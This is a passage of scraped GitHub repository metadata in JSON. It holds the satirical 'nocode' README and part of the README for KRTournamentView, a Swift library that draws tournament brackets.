"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":235},"websiteUrl":""},"repository":{"name":"nocode","primaryLanguage":null,"license":"Apache License 2.0","isArchived":false,"hasWikiEnabled":true,"forkCount":1213,"readme_md":{"text":"# No Code\n\nNo code is the best way to write secure and reliable applications. Write nothing; deploy nowhere.\n\n## Getting Started\n\nStart by not writing any code.\n\n```\n\n```\n\nThis is just an example application, but imagine it doing anything you want. Adding new features is easy too:\n\n```\n\n```\n\nThe possibilities are endless.\n\n### Building the Application\n\nNow that you have not done anything it's time to build your application:\n\n```\n\n```\n\nYep. That's it. You should see the following output:\n\n```\n\n```\n\n### Deploying\n\nWhile you still have not done anything it's time to deploy your application. By running the following command you can deploy your application absolutely nowhere.\n\n```\n\n```\n\nIt's that simple. And when it comes time to scale the application, all you have to do is:\n\n```\n\n```\n\nI know right?\n\n## Contributing\n\nYou don't.\n","byteSize":835},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":14264},"createdAt":"2018-02-06T23:54:00Z","updatedAt":"2018-02-17T08:49:33Z","pushedAt":"2018-02-16T22:01:09Z","description":"The best way to write secure and reliable applications. Write nothing; deploy nowhere.","subscribersCount":{"totalCount":177},"diskUsage":5,"pullRequestsOpen":{"totalCount":255},"pullRequestsClosed":{"totalCount":5},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":4},"commits":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":4}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":5},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":5}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":3},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":3},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":11},"commits":{"totalCount":3}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":8},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":3},"commits":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":3},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":7}}},{"node":{"comments":{"totalCount":6},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":3},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":5},"commits":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}}]},"PRClosedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":3},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":5}}}]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":1516},"issuesClosed":{"totalCount":85},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":5},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":6},"participants":{"totalCount":5}}},{"node":{"comments":{"totalCount":4},"participants":{"totalCount":4}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":5},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":5},"participants":{"totalCount":4}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":5},"participants":{"totalCount":4}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":6},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":8},"participants":{"totalCount":6}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":4}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":4}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":4},"participants":{"totalCount":5}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":3},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":5},"participants":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":4},"participants":{"totalCount":4}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":6},"participants":{"totalCount":5}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":3}}},"tags":{"totalCount":1},"releases":{"totalCount":1},"type":"user"},"siteAdmin":"false"},{"user":{"login":"krimpedance","followers":{"totalCount":17},"repositories":{"totalCount":20},"following":{"totalCount":6},"location":"Izuka, Fukuoka, Japan","organizations":{"totalCount":0},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":4},"websiteUrl":"http://krimpedance.com"},"repository":{"name":"KRTournamentView","primaryLanguage":{"name":"Swift"},"license":"MIT License","isArchived":false,"hasWikiEnabled":true,"forkCount":11,"readme_md":{"text":"[日本語](./README_Ja.md)\n\n<img src=\"https://github.com/krimpedance/Resources/blob/master/KRTournamentView/logo.png\" width=\"100%\" />\n\n[![Version](https://img.shields.io/cocoapods/v/KRTournamentView.svg?style=flat)](http://cocoapods.org/pods/KRTournamentView)\n[![License](https://img.shields.io/cocoapods/l/KRTournamentView.svg?style=flat)](http://cocoapods.org/pods/KRTournamentView)\n[![Platform](https://img.shields.io/cocoapods/p/KRTournamentView.svg?style=flat)](http://cocoapods.org/pods/KRTournamentView)\n[![Download](https://img.shields.io/cocoapods/dt/KRTournamentView.svg?style=flat)](http://cocoapods.org/pods/KRTournamentView)\n[![Carthage compatible](https://img.shields.io/badge/Carthage-compatible-4BC51D.svg?style=flat)](https://github.com/Carthage/Carthage)\n[![CI Status](http://img.shields.io/travis/krimpedance/KRTournamentView.svg?style=flat)](https://travis-ci.org/krimpedance/KRTournamentView)\n\n`KRTournamentView` is a flexible tournament bracket that can correspond to the various structure.\n\n<img src=\"https://github.com/krimpedance/Resources/blob/master/KRTournamentView/demo.gif\" height=400 />\n\n<img src=\"https://github.com/krimpedance/Resources/blob/master/KRTournamentView/styles.png\" width=\"100%\" />\n\n\n## Features\n+ Corresponding to the various structures\n+ Simple implementation\n\n\n## Requirements\n- iOS 8.0+\n- Xcode 9.0+\n- Swift 4.0+\n\n\n## DEMO\nTo run the example project, clone the repo, and open `KRTournamentViewDemo.xcodeproj` from the DEMO directory.\n\nor [appetize.io](https://appetize.io/app/yevb2mx7ea7p10cjqb9fp3tenm)\n\n\n## Installation\nKRTournamentView is available through [CocoaPods](http://cocoapods.org) and [Carthage](https://github.com/Carthage/Carthage).\nTo install it, simply add the following line to your Podfile or Cartfile:\n\n```ruby\n# CocoaPods\npod \"KRTournamentView\"\n```\n\n```ruby\n# Carthage\ngithub \"Krimpedance/KRTournamentView\"\n```\n\n## Usage\n(see sample Xcode project in /DEMO)\n\n`KRTournamentView` controls presentation and behavior by `KRTournamentViewDataSource` and `KRTournamentViewDelegate` like a `UITableView`.\n\n```swift\nlet tournamentView = KRTournamentView()\ntournamentView.dataSource = self\ntournamentView.delegate = self\naddSubview(tournamentView)\n```\n\n\n### KRTournamentViewDataSource\n\nThis protocol represents the data model object.\n\n```swift\nprotocol KRTournamentViewDataSource {\n    // Returns number of layers in tournament bracket.\n    func numberOfLayers(in tournamentView: KRTournamentView) -> Int\n    // Implements a view for each entry.\n    func tournamentView(_ tournamentView: KRTournamentView, entryAt index: Int) -> KRTournamentViewEntry?\n    // Implements a view for each match. The winner can be set here.\n    func tournamentView(_ tournamentView: KRTournamentView, matchAt matchPath: MatchPath) -> KRTournamentViewMatch\n}\n```\n\n+ `numberOfLayers(in tournamentView: KRTournamentView) -> Int`\n\n  Layer represents height of the tournament bracket.\n  Lowermost layer (i.e. first round) is `1`.\n\n  Entries 2 to 4 when the layer is 2, Entries 2 to 8 when the layer is 3. (`2^layer` entries)\n\n+ `tournamentView(_ tournamentView: KRTournamentView, entryAt index: Int) -> KRTournamentViewEntry?`\n\n  This function repeats as many times as the number of entries.\n  `index` is numbered from left to right, from top to bottom.\n\n  You can create your own design by extending `KRTournamentViewEntry`.\n\n  If there is no entry in an index, it can be reflected by returning `nil`.\n\n  e.g. When the entry with `index` 0, 4, 6 is set to `nil`\n\n  <img src=\"https://github.com/krimpedance/Resources/blob/master/KRTournamentView/seed.png\" height=200 />\n\n+ `tournamentView(_ tournamentView: KRTournamentView, matchAt matchPath: MatchPath) -> KRTournamentViewMatch`\n\n  This function repeats as many times as the number of games.\n\n  `matchPath.layer` represents the layer.\n  `matchPath.layer` represents the game number.\n  It is numbered from left to right, from top to bottom.\n  (Please see **KRTournamentViewMatch section** for details)\n\n  You can create your own design by extending `KRTournamentViewMatch`.\n\n  Win or lose is reflected by setting `.home` or `.away` to `KRTournamentViewMatch.preferredSide`.\n  The left or top entry is `.home`, the right or bottom entry is `.away`.\n\n  e.g. When `preferredSide` of Match (`MatchPath(layer: 1, number: 0)`) is set to `.home`\n\n  <img src=\"https://github.com/krimpedance/Resources/blob/master/KRTournamentView/preferredSide.png\" height=200 />\n\n\n### KRTournamentViewDelegate\n\nThis protocol represents the entries size and behaviour of the entries and matches.\n\n```swift\nprotocol KRTournamentViewDelegate {\n    // Returns entries size.\n    func entrySize(in tournamentView: KRTournamentView) -> CGSize\n    // Called after the user changes the selection of entry.\n    func tournamentView(_ tournamentView: KRTournamentView, didSelectEntryAt index: Int)\n    // Called after the user changes the selection of match.\n    func tournamentView(_ tournamentView: KRTournamentView, didSelectMatchAt matchPath: MatchPath)\n}\n```\n\n+ `entrySize(in tournamentView: KRTournamentView) -> CGSize`\n\n  Default is `CGSize(width: 80, height: 30)`.\n  (The value is reversed when entries is widthwise (e.g. `.top` style).)\n\n  This value simultaneously represents the display space of entries.\n  (lengthwise direction uses `width`, widthwise direction uses `height`.)\n\n\n## Reload the data\n\nTo reload the data, use the following function.\n\n```swift\nfunc reloadData()\n```\n\n\n## Explanation of class etc\n\n### KRTournamentViewEntry\n\nBase class for Entry.\n\nDisplay size can be set with `KRTournamentViewDelegate`.\nDisplay position is calculated automatically.\n\nThere is `textLabel` of `KRTournamentViewEntryLabel` class as minimum configuration.\nThis is only initialized if necessary. (implemented by `lazy var`)\n\n`KRTournamentViewEntryLabel` is a small wrapper class of `UILabel` to ease vertical writing.\n\n\n### KRTournamentViewMatch\n\nBase class for Match.\n\nDisplay frame is calculated automatically. (See the figure below)\n\nThere is `imageView` of `UIImageView` class as minimum configuration.\nThis is only initialized if necessary. (implemented by `lazy var`)\n\nThe center of `imageView` is always at the intersection of the line by auto layout.\n**When changing the size, please use `imageSize` property.**\n\n`preferredSide` represents a win or loss.\n\n\n##### MatchPath\n\nThis is a struct object composed of `layer` and `number`, and it represents the path of each Match.\n\nThis can get the serial number in the tournament bracket with the `getIndex(from numberOfLayers: Int)` function.\n\nThe relationship between `layer`, `number` and `index` is as shown below.\n(The number in the orange circle is `index`, the number in the upper right of it is `(layer)-(number)`.)\n\n|`.left`|`.topBottom`|\n|:--:|:--:|\n|<img src=\"https://github.com/krimpedance/Resources/blob/master/KRTournamentView/match_left.png\" height=300 />|<img src=\"https://github.com/krimpedance/Resources/blob/master/KRTournamentView/match_topBottom.png\" height=300 />|\n\n\n## Style and color\n\n### The orientation of the tournament bracket\n\nSet the orientation of the tournament bracket in the `style` property.\n\n|`.left`|`.right`|`.top`|`.bottom`|`.leftRight(direction: .top)`|`.topBottom(direction: .right)`|\n|:--:|:--:|:--:|:--:|:--:|:--:|\n|<img src=\"https://github.com/krimpedance/Resources/blob/master/KRTournamentView/tournament_left.png\" />|<img src=\"https://github.com/krimpedance/Resources/blob/master/KRTournamentView/tournament_right.png\" />|<img src=\"https://github.com/krimpedance/Resources/blob/master/KRTournamentView/tournament_top.png\" />|<img src=\"https://github.com/krimpedance/Resources/blob/master/KRTournamentView/tournament_bottom.png\" />|<img src=\"https://github.com/krimpedance/Resources/blob/master/KRTournamentView/tournament_leftRight.png\" />|<img src=\"https://github.com/krimpedance/Resources/blob/master/KRTournamentView/tournament_topBottom.png\" />|\n\nSet the direction of the finish match line to the `direction` property of `.leftRight` and `.topBottom`.\n\n+ `.leftRight` : `.top` or `.bottom`\n+ `.topBottom` : `.right` or `.left`\n\n\n### color and line width\n\nCustomize with the following properties.\n\n```swift\nvar lineColor: UIColor              // Line color (default is black).\nvar preferredLinecolor: UIColor     // Winner's line color (default is red).\nvar lineWidth: CGFloat              // Line width (default is 1.0).\nvar preferredLineWidth: CGFloat?    // Winner's line width (default is nil). In the case of nil, it is the same as lineWidth.\n```\n\n### Behavior by rotating the screen\n\nWhen the following property is set to `true`, the tournament bracket will be in the same orientation as before rotation.\n\nHowever, the order of entries may change.\n(Entries are always in order from left to right, top to bottom.)\n\n```swift\nvar fixOrientation: Bool = 